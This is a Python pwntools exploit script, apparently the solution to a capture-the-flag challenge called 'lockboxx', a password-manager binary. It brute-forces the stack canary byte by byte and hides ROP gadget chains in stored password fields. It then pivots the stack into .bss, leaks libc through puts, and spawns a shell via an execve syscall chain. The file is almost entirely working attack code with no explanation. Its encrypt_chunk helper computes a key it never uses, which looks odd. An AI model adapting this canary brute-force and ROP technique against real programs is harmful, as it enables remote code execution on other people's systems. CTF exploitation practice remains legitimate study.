#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

exe = context.binary = ELF('lockboxx_patched')
libc = exe.libc
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *update_master_password+289
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

mp = b""

def init():
    global io

    io = start()


def setup_master_pass(password):
    io.sendlineafter(b":", password)

def add_password(pid, url, username, email, password):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b":", str(pid).encode())
    io.sendlineafter(b":", url)
    io.sendlineafter(b":", username)
    io.sendlineafter(b":", email)
    io.sendlineafter(b":", password)

def remove_password(pid):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", str(pid).encode())

def list_password():
    io.sendlineafter(b">>", b"3")

def update_master_password(old_mp, new_mp, overflow=False):
    io.sendlineafter(b">>", b"4")
    io.sendafter(b":", old_mp)
    io.sendafter(b":", new_mp)
    if not overflow:
        res = io.recvlines(4)
        return res

def share_password(data):
    io.sendlineafter(b">>", b"5")
    io.send(data)

def brute_force_canary():
    global mp 
    canary = b""
    while len(canary) != 8:
        for i in range(0xff):
            data = canary + bytes([i])
            new_mp = b"\x00"*(8*5) + data
            res = update_master_password(mp, new_mp)
            mp = new_mp[:30]
            if b"terminated" not in res[-1]:
                canary += bytes([i])
                break
        
    return canary
        
def encrypt_chunk(data, seed):
    n = len(data)
    result = bytearray(n)
    for i in range(n - 1):
        lib = CDLL(None)
        lib.srand(seed)
        xk = lib.rand() & 0xff
        result[i] = data[i] ^ 1
    return result

def stack_pivot(canary, seed):
    global mp 

    pop_rdi = 0x401603 # pop rdi; pop rbp; ret; 
    pop_rsi = 0x401601 # pop rsi ; pop r15 ; pop rbp ; ret
    pop_rbp = 0x40127d # pop rbp; ret;
    rbp_pivot = exe.bss() + 0x500

    url = flat(
        [
            pop_rdi,
            exe.got["puts"],
            rbp_pivot,
            exe.plt["puts"]
        ]
    )

    username = flat(
        [
            pop_rdi,
            0x0,
        ]
    )

    email = flat(
        [
            rbp_pivot,
            pop_rsi,
            rbp_pivot - 0x8
        ]
    )

    password = flat(
        [   
            0x0,
            rbp_pivot,
            exe.sym["share_password"] + 39
        ]
    )

    chunks = [
        url, username, email, password
    ]

    for i in range(len(chunks)):
        chunks[i] = encrypt_chunk(chunks[i], seed)

    sleep(3)
    add_password(1337, chunks[0], chunks[1], chunks[2], chunks[3])

    offset = 40
    leave_ret = 0x4017c3 # leave; ret;
    pivot = flat({
        offset: [
            canary,
            b"A"*16,
            exe.bss() + 0x1e0,
            leave_ret
        ]
    })

    info("canary: %#x", canary)
    update_master_password(mp, pivot, overflow=True)

    io.recvuntil(b".\n")
    puts = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    pop_rax = libc.address + 0xdd237  # pop rax ; ret
    pop_rdi = libc.address + 0x10f75b # pop rdi ; ret
    pop_rsi = libc.address + 0x110a4d # pop rsi ; ret
    pop_rdx = libc.address + 0x1a1034 # pop rdx; add rdi, rsi; xor eax, eax; cmp rdx, rsi; cmova rax, rdi; ret;
    pop_rcx = libc.address + 0xa876e  # pop rcx ; ret
    syscall = libc.address + 0x98fa6  # syscall; ret

    payload = flat(
        [
            canary,
            b"A"*8,
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            pop_rsi,
            0x0,
            pop_rax,
            0x3b,
            syscall
        ]
    )
    print(len(payload))
    sleep(0.5)
    io.send(payload)
    


def solve():
    global mp
    mp = b"hacking"
    seed = (int(time.time()) // 5)
    info("seed: %#x", seed)

    setup_master_pass(mp)
    
    for i in range(4):
        add_password(i+1, b"out", b"out", b"out", b"out")

    canary = u64(brute_force_canary())    
    stack_pivot(canary, seed)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

